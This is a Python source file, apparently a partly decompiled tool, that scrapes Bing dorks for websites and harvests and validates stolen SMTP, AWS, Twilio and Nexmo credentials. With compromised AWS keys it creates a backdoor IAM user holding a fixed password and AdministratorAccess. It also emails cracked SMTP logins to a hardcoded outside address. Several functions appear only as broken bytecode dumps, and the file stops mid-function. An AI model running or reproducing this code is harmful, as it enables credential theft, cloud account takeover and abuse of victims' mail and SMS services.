from multiprocessing.dummy import Pool
import warnings, random, socket, threading
from re import findall as reg
import requests, re, sys, os
from colorama import Fore
from colorama import init
from time import time as timer
import time, datetime
from multiprocessing.dummy import Pool
import smtplib, json, urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from socket import gaierror
from twilio.rest import Client
import boto3
init()
Targetssaaa = 'sendto.ini'
fsetting = open(Targetssaaa, 'r').read()
path = 'path.ini'
pathop = open(path, 'r')
pathline = pathop.read().split('\n')
lock = threading.Lock()

class bcolors:
    HEADER = '\x1b[95m'
    OKBLUE = '\x1b[94m'
    OKGREEN = '\x1b[92m'
    WARNING = '\x1b[93m'
    FAIL = '\x1b[91m'
    ENDC = '\x1b[0m'
    BOLD = '\x1b[1m'
    UNDERLINE = '\x1b[4m'
    WHITE = '\x1b[0m'


Headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50'}

def get_balance(a, t):
    r = requests.get(('https://api.twilio.com/2010-04-01/Accounts/' + a + '/Balance.json'), auth=(a, t))
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    balance = resp['balance']
    currency = resp['currency']
    return str(balance) + ' ' + str(currency)


def get_phone(a, t):
    client = Client(a, t)
    incoming_phone_numbers = client.incoming_phone_numbers.list(limit=20)
    for record in incoming_phone_numbers:
        return record.phone_number


def get_type(a, t):
    client = Client(a, t)
    account = client.api.accounts.create()
    return account.type


def send_sms--- This code section failed: ---

 L.  69         0  SETUP_FINALLY        42  'to 42'

 L.  70         2  LOAD_GLOBAL              Client
                4  LOAD_FAST                'a'
                6  LOAD_FAST                't'
                8  CALL_FUNCTION_2       2  ''
               10  STORE_FAST               'client'

 L.  71        12  LOAD_FAST                'client'
               14  LOAD_ATTR                messages
               16  LOAD_ATTR                create

 L.  72        18  LOAD_GLOBAL              str
               20  LOAD_FAST                'bod'
               22  CALL_FUNCTION_1       1  ''

 L.  73        24  LOAD_FAST                'phone'

 L.  74        26  LOAD_FAST                'tos'

 L.  71        28  LOAD_CONST               ('body', 'from_', 'to')
               30  CALL_FUNCTION_KW_3     3  '3 total positional and keyword args'
               32  STORE_FAST               'message'

 L.  76        34  LOAD_FAST                'message'
               36  LOAD_ATTR                status
               38  POP_BLOCK        
               40  RETURN_VALUE     
             42_0  COME_FROM_FINALLY     0  '0'

 L.  77        42  POP_TOP          
               44  POP_TOP          
               46  POP_TOP          

 L.  78        48  POP_EXCEPT       
               50  LOAD_STR                 'die'
               52  RETURN_VALUE     
               54  END_FINALLY      

Parse error at or near `POP_EXCEPT' instruction at offset 48


def awslimitcheck(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        if 'error' not in str(response):
            print(bcolors.WHITE + ACCESS_KEY + ' ==> ' + bcolors.WARNING + 'Success Check Limit')
            print(str(response))
            save = open('Result/success_check_limit_awskey.txt', 'a')
            remover = str(response).replace(',', '\n')
            save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n' + remover + '\n\n=================================\n\n')
            save.close()
            Targetssa = input('Restart tools [y/n] : ')
            if Targetssa == 'n':
                sys.exit()
            else:
                print('Load Menu On 1 sec')
                print('-------------------------------')
                time.sleep(1)
                cinxx()
        else:
            print(bcolors.WHITE + ACCESS_KEY + ' ==> ' + bcolors.FAIL + 'Failed Check Limit')
    except Exception as e:
        try:
            print(bcolors.WHITE + ACCESS_KEY + ' ==> ' + bcolors.FAIL + 'Failed Check Limit')
        finally:
            e = None
            del e


def nexmosend(url, a, s):
    r = requests.get('https://rest.nexmo.com/sms/json?api_key=' + str(a) + '&api_secret=' + str(s) + '&to=15103197861&text="test"&from="TEST"')
    Json = json.dumps(r.json())
    resp = json.loads(Json)
    test = resp['messages']
    try:
        balance = test[0]['remaining-balance']
    except:
        balance = 'Error'

    try:
        errorcode = test[0]['error-text']
    except:
        errorcode = 'UNKNOWN'
    else:
        if 'Quota Exceeded - rejected' in errorcode:
            print(bcolors.WARNING + str(a) + ' => ' + bcolors.OKBLUE + 'Quota Exceeded - rejected | Balance : ' + str(balance))
        else:
            if 'Bad Credentials' in errorcode:
                print(bcolors.WARNING + str(a) + ' => ' + bcolors.FAIL + 'Bad Credentials')
            else:
                if 'Error' not in balance:
                    print(bcolors.WARNING + str(a) + ' => ' + bcolors.OKGREEN + 'Valid | Balance : ' + str(balance))
                    build = 'API_KEY : ' + str(a) + '\nAPI_SECRET : ' + str(s) + '\nBALANCE : ' + str(balance) + '\n\n'
                    save = open('Result/valid_nexmo.txt', 'a')
                    save.write(build)
                    save.close()
                    sendtestnexmo(url, a, s, balance)
                else:
                    print(bcolors.WARNING + str(a) + ' => Cant Send to US | error code: ' + str(errorcode))
                    build = 'API_KEY : ' + str(a) + '\nAPI_SECRET : ' + str(s) + '\nBALANCE : ' + str(balance) + 'ERROR : ' + str(errorcode) + '\n\n'
                    save = open('Result/valid_nexmo.txt', 'a')
                    save.write(build)
                    save.close()


def twilliocheck(url, acc_sid, acc_key, acc_from):
    account_sid = acc_sid
    auth_token = acc_key
    client = Client(account_sid, auth_token)
    account = client.api.accounts.create()
    if 'Unable to create record: Authenticate' not in account.sid:
        print('TWILLIO VALID SEND API')
        balance = get_balance(acc_sid, acc_key)
        number = get_phone(acc_sid, acc_key)
        type = get_type(acc_sid, acc_key)
        bod = 'test'
        nopetest = '+14303052705'
        send = send_sms(acc_sid, acc_key, bod, number, nopetest)
        if send == 'die':
            status = 'CANT SEND SMS TO US'
        else:
            status = 'LIVE'
        save = open('Result/valid_twillio.txt', 'a')
        build = 'URL: ' + str(url) + '\nSTATUS : ' + format(str(status)) + '\nAccount SID : ' + str(acc_sid) + '\nAuth Key: ' + str(acc_key) + '\nBalance : ' + format(str(balance)) + '\nFROM: ' + format(str(number)) + '\nAccount Type : ' + format(str(type)) + '\n\n------------------------------------------------\n'
        save.write(build)
        save.close()
        sendtesttwillio(url, acc_sid, acc_key, acc_from, status, balance)


def autocreate(ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='ses_xcatze')
        response2 = client2.create_login_profile(UserName='ses_xcatze',
          Password='ses_xcatze123',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='ses_xcatze')
        with lock:
            print(bcolors.WHITE + ACCESS_KEY + ' ==> ' + bcolors.OKGREEN + 'Success Create User')
        save = open('Result/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + ACCESS_KEY + '\nSECRET KEY : ' + SECRET_KEY + '\nREGION : ' + REGION + '\n\n==> Created User\n\n' + remover2 + '\n\n==> USER & PASS IAM USER\n\nUser : ses_xcatze\nPass : ses_xcatze123\n\n' + remover + '\n\n=================================\n\n')
        save.close()
        try:
            url = 'FROM CRACK TOOL'
            sendtestaws(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            with lock:
                print(bcolors.WHITE + ACCESS_KEY + ' ==> ' + bcolors.FAIL + 'Failed Create User')
        finally:
            e = None
            del e


def autocreateses(url, ACCESS_KEY, SECRET_KEY, REGION):
    try:
        client = boto3.client('ses',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response = client.get_send_quota()
        client2 = boto3.client('iam',
          aws_access_key_id=ACCESS_KEY,
          aws_secret_access_key=SECRET_KEY,
          region_name=REGION)
        response1 = client2.create_user(UserName='ses_xcatze')
        response2 = client2.create_login_profile(UserName='ses_xcatze',
          Password='ses_xcatze123',
          PasswordResetRequired=False)
        response3 = client2.create_group(GroupName='AdminsDDefault')
        response4 = client2.attach_group_policy(GroupName='AdminsDDefault',
          PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
        response5 = client2.add_user_to_group(GroupName='AdminsDDefault',
          UserName='ses_xcatze')
        print(ACCESS_KEY + ' ==> Success Create User')
        save = open('Result/cracked_ses_from_awskey.txt', 'a')
        remover = str(response).replace(',', '\n')
        remover2 = str(response1).replace(',', '\n')
        save.write('ACCESS KEY : ' + str(ACCESS_KEY) + '\nSECRET KEY : ' + str(SECRET_KEY) + '\nREGION : ' + str(REGION) + '\n\n==> Created User\n\n' + str(remover2) + '\n\n==> USER & PASS IAM USER\n\nUser : ses_xcatze\nPass : ses_xcatze123\n\n' + str(remover) + '\n\n=================================\n\n')
        save.close()
        try:
            sendtestaws(url, ACCESS_KEY, SECRET_KEY, REGION, remover2, remover)
        except:
            pass

    except Exception as e:
        try:
            print(ACCESS_KEY + ' ==> Failed Create User')
        finally:
            e = None
            del e


class dorker(object):

    def __init__(self, dork, pages, proxy):
        self.dork = dork
        self.page_ammount = pages
        self.domains_bing = []
        self.proxy_required = proxy
        self.first_page_links = []

    def filter_and_adding(self, domains_list):
        alert_string = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'INFO' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(alert_string + '-> Checking Smtp ..')
        print()
        data = open('blacklist/sites.txt').readlines()
        new_data = [items.rstrip() for items in data]
        for domains in domains_list:
            domain_data = domains.split('/')
            new_domain = domain_data[0] + '//' + domain_data[2] + '/'
            if new_domain not in new_data:
                self.domains_bing.append(new_domain)
                jembotngw2(new_domain)
                print(new_domain, file=(open('result/sitesgrab.txt', 'a')))

    def first_page(self):
        try:
            url = 'https://www.bing.com/search?q=' + self.dork + '&first=' + '1' + '&FORM=PERE'
            header = {'user-agent': 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'}
            source_code = requests.get(url, headers=header).text
            keyword = '<li class="b_algo"><h2><a href="'
            split_data = source_code.split(keyword)
            for x in range(10):
                links_ = split_data[(x + 1)].split('"')[0]
                self.first_page_links.append(links_)

        except IndexError:
            pass

    def searcher--- This code section failed: ---

 L. 311         0  LOAD_GLOBAL              range
                2  LOAD_FAST                'self'
                4  LOAD_ATTR                page_ammount
                6  CALL_FUNCTION_1       1  ''
                8  GET_ITER         
             10_0  COME_FROM           430  '430'
             10_1  COME_FROM           420  '420'
            10_12  FOR_ITER            448  'to 448'
               14  STORE_FAST               'i'

 L. 312        16  LOAD_STR                 'https://www.bing.com/search?q='
               18  LOAD_FAST                'self'
               20  LOAD_ATTR                dork
               22  BINARY_ADD       
               24  LOAD_STR                 '&first='
               26  BINARY_ADD       
               28  LOAD_GLOBAL              str
               30  LOAD_FAST                'i'
               32  CALL_FUNCTION_1       1  ''
               34  BINARY_ADD       
               36  LOAD_STR                 '1'
               38  BINARY_ADD       
               40  LOAD_STR                 '&FORM=PERE'
               42  BINARY_ADD       
               44  STORE_FAST               'url'

 L. 313        46  LOAD_GLOBAL              Fore
               48  LOAD_ATTR                LIGHTCYAN_EX
               50  LOAD_STR                 '['
               52  BINARY_ADD       
               54  LOAD_GLOBAL              Fore
               56  LOAD_ATTR                LIGHTBLUE_EX
               58  BINARY_ADD       
               60  LOAD_STR                 '-'
               62  BINARY_ADD       
               64  LOAD_GLOBAL              Fore
               66  LOAD_ATTR                LIGHTCYAN_EX
               68  BINARY_ADD       
               70  LOAD_STR                 ']'
               72  BINARY_ADD       
               74  LOAD_GLOBAL              Fore
               76  LOAD_ATTR                WHITE
               78  BINARY_ADD       
               80  STORE_FAST               'info_string_box'

 L. 314        82  LOAD_GLOBAL              Fore
               84  LOAD_ATTR                LIGHTCYAN_EX
               86  LOAD_STR                 '['
               88  BINARY_ADD       
               90  LOAD_GLOBAL              Fore
               92  LOAD_ATTR                LIGHTGREEN_EX
               94  BINARY_ADD       
               96  LOAD_STR                 '+'
               98  BINARY_ADD       
              100  LOAD_GLOBAL              Fore
              102  LOAD_ATTR                LIGHTCYAN_EX
              104  BINARY_ADD       
              106  LOAD_STR                 ']'
              108  BINARY_ADD       
              110  LOAD_GLOBAL              Fore
              112  LOAD_ATTR                WHITE
              114  BINARY_ADD       
              116  STORE_FAST               'added_sting'

 L. 316       118  LOAD_GLOBAL              print
              120  LOAD_FAST                'info_string_box'
              122  LOAD_STR                 ' Printing Page  '
              124  LOAD_FAST                'i'
              126  FORMAT_VALUE          0  ''
              128  BUILD_STRING_2        2 
              130  BINARY_ADD       
              132  CALL_FUNCTION_1       1  ''
              134  POP_TOP          

 L. 317       136  LOAD_GLOBAL              print
              138  CALL_FUNCTION_0       0  ''
              140  POP_TOP          

 L. 319       142  LOAD_STR                 'user-agent'

 L. 319       144  LOAD_STR                 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0'

 L. 318       146  BUILD_MAP_1           1 
              148  STORE_FAST               'header'

 L. 321       150  SETUP_FINALLY       304  'to 304'

 L. 322       152  LOAD_GLOBAL              requests
              154  LOAD_ATTR                get
              156  LOAD_FAST                'url'
              158  LOAD_FAST                'header'
              160  LOAD_CONST               ('headers',)
              162  CALL_FUNCTION_KW_2     2  '2 total positional and keyword args'
              164  LOAD_ATTR                text
              166  STORE_FAST               'source_code'

 L. 323       168  LOAD_STR                 '<li class="b_algo"><h2><a href="'
              170  STORE_FAST               'keyword'

 L. 324       172  LOAD_FAST                'source_code'
              174  LOAD_METHOD              split
              176  LOAD_FAST                'keyword'
              178  CALL_METHOD_1         1  ''
              180  STORE_FAST               'split_data'

 L. 325       182  BUILD_LIST_0          0 
              184  STORE_FAST               'temporary_domain_list'

 L. 326       186  SETUP_FINALLY       254  'to 254'

 L. 327       188  LOAD_GLOBAL              range
              190  LOAD_CONST               10
              192  CALL_FUNCTION_1       1  ''
              194  GET_ITER         
              196  FOR_ITER            250  'to 250'
              198  STORE_FAST               'x'

 L. 328       200  LOAD_FAST                'split_data'
              202  LOAD_FAST                'x'
              204  LOAD_CONST               1
              206  BINARY_ADD       
              208  BINARY_SUBSCR    
              210  LOAD_METHOD              split
              212  LOAD_STR                 '"'
              214  CALL_METHOD_1         1  ''
              216  LOAD_CONST               0
              218  BINARY_SUBSCR    
              220  STORE_FAST               'links_'

 L. 329       222  LOAD_FAST                'temporary_domain_list'
              224  LOAD_METHOD              append
              226  LOAD_FAST                'links_'
              228  CALL_METHOD_1         1  ''
              230  POP_TOP          

 L. 330       232  LOAD_GLOBAL              print
              234  LOAD_FAST                'added_sting'
              236  LOAD_STR                 ' - '
              238  BINARY_ADD       
              240  LOAD_FAST                'links_'
              242  BINARY_ADD       
              244  CALL_FUNCTION_1       1  ''
              246  POP_TOP          
              248  JUMP_BACK           196  'to 196'
              250  POP_BLOCK        
              252  JUMP_FORWARD        276  'to 276'
            254_0  COME_FROM_FINALLY   186  '186'

 L. 332       254  DUP_TOP          
              256  LOAD_GLOBAL              IndexError
              258  COMPARE_OP               exception-match
          260_262  POP_JUMP_IF_FALSE   274  'to 274'
              264  POP_TOP          
              266  POP_TOP          
              268  POP_TOP          

 L. 333       270  POP_EXCEPT       
              272  JUMP_FORWARD        276  'to 276'
            274_0  COME_FROM           260  '260'
              274  END_FINALLY      
            276_0  COME_FROM           272  '272'
            276_1  COME_FROM           252  '252'

 L. 335       276  LOAD_GLOBAL              print
              278  CALL_FUNCTION_0       0  ''
              280  POP_TOP          

 L. 336       282  LOAD_GLOBAL              print
              284  LOAD_STR                 '--------'
              286  CALL_FUNCTION_1       1  ''
              288  POP_TOP          

 L. 337       290  LOAD_FAST                'self'
              292  LOAD_METHOD              filter_and_adding
              294  LOAD_FAST                'temporary_domain_list'
              296  CALL_METHOD_1         1  ''
              298  POP_TOP          
              300  POP_BLOCK        
              302  JUMP_FORWARD        414  'to 414'
            304_0  COME_FROM_FINALLY   150  '150'

 L. 340       304  DUP_TOP          
              306  LOAD_GLOBAL              requests
              308  LOAD_ATTR                exceptions
              310  LOAD_ATTR                HTTPError
              312  COMPARE_OP               exception-match
          314_316  POP_JUMP_IF_FALSE   340  'to 340'
              318  POP_TOP          
              320  POP_TOP          
              322  POP_TOP          

 L. 341       324  LOAD_GLOBAL              print
              326  LOAD_STR                 'Http error retrying'
              328  CALL_FUNCTION_1       1  ''
              330  POP_TOP          

 L. 342       332  POP_EXCEPT       
              334  JUMP_BACK            10  'to 10'
              336  POP_EXCEPT       
              338  JUMP_FORWARD        414  'to 414'
            340_0  COME_FROM           314  '314'

 L. 343       340  DUP_TOP          
              342  LOAD_GLOBAL              requests
              344  LOAD_ATTR                exceptions
              346  LOAD_ATTR                ConnectTimeout
              348  COMPARE_OP               exception-match
          350_352  POP_JUMP_IF_FALSE   376  'to 376'
              354  POP_TOP          
              356  POP_TOP          
              358  POP_TOP          

 L. 344       360  LOAD_GLOBAL              print
              362  LOAD_STR                 'Connection timed out error retrying'
              364  CALL_FUNCTION_1       1  ''
              366  POP_TOP          

 L. 345       368  POP_EXCEPT       
              370  JUMP_BACK            10  'to 10'
              372  POP_EXCEPT       
              374  JUMP_FORWARD        414  'to 414'
            376_0  COME_FROM           350  '350'

 L. 346       376  DUP_TOP          
              378  LOAD_GLOBAL              requests
              380  LOAD_ATTR                exceptions
              382  LOAD_ATTR                Timeout
              384  COMPARE_OP               exception-match
          386_388  POP_JUMP_IF_FALSE   412  'to 412'
              390  POP_TOP          
              392  POP_TOP          
              394  POP_TOP          

 L. 347       396  LOAD_GLOBAL              print
              398  LOAD_STR                 'Timeout error retrying'
              400  CALL_FUNCTION_1       1  ''
              402  POP_TOP          

 L. 348       404  POP_EXCEPT       
              406  JUMP_BACK            10  'to 10'
              408  POP_EXCEPT       
              410  JUMP_FORWARD        414  'to 414'
            412_0  COME_FROM           386  '386'
              412  END_FINALLY      
            414_0  COME_FROM           410  '410'
            414_1  COME_FROM           374  '374'
            414_2  COME_FROM           338  '338'
            414_3  COME_FROM           302  '302'

 L. 350       414  LOAD_FAST                'i'
              416  LOAD_CONST               0
              418  COMPARE_OP               !=
              420  POP_JUMP_IF_FALSE    10  'to 10'

 L. 351       422  LOAD_FAST                'self'
              424  LOAD_ATTR                first_page_links
              426  LOAD_FAST                'temporary_domain_list'
              428  COMPARE_OP               ==
              430  POP_JUMP_IF_FALSE    10  'to 10'

 L. 352       432  LOAD_GLOBAL              print
              434  LOAD_STR                 'Same Urls Found Again. Last Resulsts Reached | Removing Dublicates.'
              436  CALL_FUNCTION_1       1  ''
              438  POP_TOP          

 L. 353       440  POP_TOP          
          442_444  JUMP_ABSOLUTE       448  'to 448'
              446  JUMP_BACK            10  'to 10'

Parse error at or near `POP_EXCEPT' instruction at offset 336

    def start(self):
        self.first_page()
        self.searcher()
        print(f"Done Total sites scrapped {len(self.domains_bing)}")


proxy_error = 0
sites_list = []
if os.name == 'nt':
    os.system('cls')
else:
    os.system('clear')
init(convert=True)

class settings:
    y = Fore.YELLOW
    r = Fore.RED
    b = Fore.BLUE


def ip_grabber(site, sites_length, current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f": {site} - " + added_sting + f": {ip}")
        oother = open('result/websitetoip.txt', 'a')
        oother.write(ip + '\n')
        oother.close()
    except socket.gaierror:
        pass


def ip_grabberautoscan(site, sites_length, current):
    try:
        ip = socket.gethostbyname(site)
        info_string_box = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTBLUE_EX + 'SITE' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        added_sting = Fore.LIGHTCYAN_EX + '[' + Fore.LIGHTGREEN_EX + 'IP' + Fore.LIGHTCYAN_EX + ']' + Fore.WHITE
        print(info_string_box + f": {site} - " + added_sting + f": {ip}")
        dorkscan(ip)
        oother = open('result/websitetoip.txt', 'a')
        oother.write(ip + '\n')
        oother.close()
    except socket.gaierror:
        pass


def clean():
    lines_seen = set()
    Targetssa = input('\x1b[1;37;40mInput Your List : ')
    outfile = open('rd-' + Targetssa, 'a')
    infile = open(Targetssa, 'r')
    for line in infile:
        if line not in lines_seen:
            outfile.write(line)
            lines_seen.add(line)
        outfile.close()
        infile.close()
        print('Duplicate removed successfully!')
        print('saved as rd-' + str(Targetssa))
        print('Load Menu On 1 sec')
        print('-------------------------------')
        time.sleep(1)
        cinxx()


def autodork():
    dork = input('Dork/Keyword [not a file but type directly]: ')
    print()
    print('\n      select your country, all for global | for country search in,de,fr type directly without .\n  ')
    print()
    country = input('Country: ')
    if country == 'all':
        dork_new = dork
    else:
        dork_new = dork + ' site:' + country
    pages_ = input('Pages [Note: Bing may have limited results]: ')
    dorker(dork_new, int(pages_), False).start()


binglist = {
 'http://www.bing.com/search?q=&count=50&first=1',
 'http://www.bing.com/search?q=&count=50&first=51',
 'http://www.bing.com/search?q=&count=50&first=101',
 'http://www.bing.com/search?q=&count=50&first=151',
 'http://www.bing.com/search?q=&count=50&first=201',
 'http://www.bing.com/search?q=&count=50&first=251',
 'http://www.bing.com/search?q=&count=50&first=301',
 'http://www.bing.com/search?q=&count=50&first=351',
 'http://www.bing.com/search?q=&count=50&first=401',
 'http://www.bing.com/search?q=&count=50&first=451',
 'http://www.bing.com/search?q=&count=50&first=501',
 'http://www.bing.com/search?q=&count=50&first=551',
 'http://www.bing.com/search?q=&count=50&first=601',
 'http://www.bing.com/search?q=&count=50&first=651',
 'http://www.bing.com/search?q=&count=50&first=201',
 'http://www.bing.com/search?q=&count=50&first=201',
 'http://www.bing.vn/search?q=&count=50&first=101'}

def dorkscan(dork):
    jembotngw2(dork)
    if 'ip' not in dork:
        dork = ' ip:"' + dork + '" '
    print('START REVERSE FROM IP => ' + dork)
    for bing in binglist:
        bingg = bing.replace('&count', dork + '&count')
        try:
            r = requests.get(bingg)
            checktext = r.text
            checktext = checktext.replace('<strong>', '')
            checktext = checktext.replace('</strong>', '')
            checktext = checktext.replace('<span dir="ltr">', '')
            checksites = re.findall('<cite>(.*?)</cite>', checktext)
            for sites in checksites:
                sites = sites.replace('http://', 'protocol1')
                sites = sites.replace('https://', 'protocol2')
                sites = sites + '/'
                site = sites[:sites.find('/') + 0]
                site = site.replace('protocol1', 'http://')
                site = site.replace('protocol2', 'https://')
                try:
                    jembotngw2(site)
                except:
                    pass

        except:
            pass


def sparkpostmail():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'sparkpostmail=on' in ip_listx:
        sparkpostmail = 'on'
        return sparkpostmail
    sparkpostmail = 'off'
    return sparkpostmail


def and1():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'and1=on' in ip_listx:
        and1 = 'on'
        return and1
    and1 = 'off'
    return and1


def zimbra():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'zimbra=on' in ip_listx:
        zimbra = 'on'
        return zimbra
    zimbra = 'off'
    return zimbra


def relay():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'gsuite-relay=on' in ip_listx:
        relay = 'on'
        return relay
    relay = 'off'
    return relay


def sendinblue():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'sendinblue=on' in ip_listx:
        sendinblue = 'on'
        return sendinblue
    sendinblue = 'off'
    return sendinblue


def mandrillapp():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'mandrillapp=on' in ip_listx:
        mandrillapp = 'on'
        return mandrillapp
    mandrillapp = 'off'
    return mandrillapp


def zoho():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'zoho=on' in ip_listx:
        zoho = 'on'
        return zoho
    zoho = 'off'
    return zoho


def sendgrid():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'sendgrid=on' in ip_listx:
        sendgrid = 'on'
        return sendgrid
    sendgrid = 'off'
    return sendgrid


def office365():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'office365=on' in ip_listx:
        office365 = 'on'
        return office365
    office365 = 'off'
    return office365


def mailgun():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'mailgun=on' in ip_listx:
        mailgun = 'on'
        return mailgun
    mailgun = 'off'
    return mailgun


def aws():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'aws=on' in ip_listx:
        aws = 'on'
        return aws
    aws = 'off'
    return aws


def twillio():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'twillio=on' in ip_listx:
        twillio = 'on'
        return twillio
    twillio = 'off'
    return twillio


def AWS_ACCESS_KEY():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'AWS_ACCESS_KEY=on' in ip_listx:
        AWS_ACCESS_KEY = 'on'
        return AWS_ACCESS_KEY
    AWS_ACCESS_KEY = 'off'
    return AWS_ACCESS_KEY


def AWS_KEY():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'AWS_KEY=on' in ip_listx:
        AWS_KEY = 'on'
        return AWS_KEY
    AWS_KEY = 'off'
    return AWS_KEY


def NEXMO():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'NEXMO=on' in ip_listx:
        NEXMO = 'on'
        return NEXMO
    NEXMO = 'off'
    return NEXMO


def EXOTEL():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'EXOTEL=on' in ip_listx:
        EXOTEL = 'on'
        return EXOTEL
    EXOTEL = 'off'
    return EXOTEL


def ONESIGNAL():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'ONESIGNAL=on' in ip_listx:
        ONESIGNAL = 'on'
        return ONESIGNAL
    ONESIGNAL = 'off'
    return ONESIGNAL


def TOKBOX():
    Targetssaaa = 'settings.ini'
    ip_listx = open(Targetssaaa, 'r').read()
    if 'TOKBOX=on' in ip_listx:
        TOKBOX = 'on'
        return TOKBOX
    TOKBOX = 'off'
    return TOKBOX


def sendtestoff(url, host, port, user, passw, sender):
    if '465' in str(port):
        port = '587'
    else:
        port = str(port)
    smtp_server = str(host)
    if 'UNKNOWN' in sender:
        sender_email = user
    else:
        sender_email = str(sender.replace('"', ''))
    smtp_server = str(host)
    login = str(user.replace('"', ''))
    password = str(passw.replace('"', ''))
    receiver_email = 'showdenwashere@hotmail.com'
    message = MIMEMultipart('alternative')
    message['Subject'] = 'LARAVEL SMTP CRACK LOG | HOST: ' + str(host)
    if 'zoho' in host:
        message['From'] = user
    else:
        message['From'] = sender_email
    message['To'] = receiver_email
    text = '        '
    html = f"        <html>\n          <body>\n            <p>Success Send,<br>\n              BY XCATZE</p>\n              <p>-------------------</p>\n              <p>URL    : {url}</p>\n              <p>HOST   : {host}</p>\n              <p>PORT   : {port}</p>\n              <p>USER   : {user}</p>\n              <p>PASSW  : {passw}</p>\n              <p>SENDER : {sender}</p>\n              <p>-------------------</p>\n          </body>\n        </html>\n        "
    part1 = MIMEText(text, 'plain')
    part2 = MIMEText(html, 'html')
    message.attach(part1)
    message.attach(part2)
    try:
        s = smtplib.SMTP(smtp_server, port)
        s.connect(smtp_server, port)
        s.ehlo()
        s.starttls()
        s.ehlo()
        s.login(login, password)
        s.sendmail(sender_email, receiver_email, message.as_string())
    except:
        pass


def sendtest--- This code section failed: ---

 L. 755         0  LOAD_STR                 '465'
                2  LOAD_GLOBAL              str
                4  LOAD_FAST                'port'
                6  CALL_FUNCTION_1       1  ''
                8  COMPARE_OP               in
               10  POP_JUMP_IF_FALSE    18  'to 18'

 L. 756        12  LOAD_STR                 '587'
               14  STORE_FAST               'port'
               16  JUMP_FORWARD         26  'to 26'
             18_0  COME_FROM            10  '10'

 L. 758        18  LOAD_GLOBAL              str
               20  LOAD_FAST                'port'
               22  CALL_FUNCTION_1       1  ''
               24  STORE_FAST               'port'
             26_0  COME_FROM            16  '16'

 L. 760        26  LOAD_STR                 'unknown@unknown.com'
               28  LOAD_FAST                'sender'
               30  COMPARE_OP               in
               32  POP_JUMP_IF_FALSE    48  'to 48'
               34  LOAD_STR                 '@'
               36  LOAD_FAST                'user'
               38  COMPARE_OP               in
               40  POP_JUMP_IF_FALSE    48  'to 48'

 L. 761        42  LOAD_FAST                'user'
               44  STORE_FAST               'sender_email'
               46  JUMP_FORWARD         64  'to 64'
             48_0  COME_FROM            40  '40'
             48_1  COME_FROM            32  '32'

 L. 763        48  LOAD_GLOBAL              str
               50  LOAD_FAST                'sender'
               52  LOAD_METHOD              replace
               54  LOAD_STR                 '"'
               56  LOAD_STR                 ''
               58  CALL_METHOD_2         2  ''
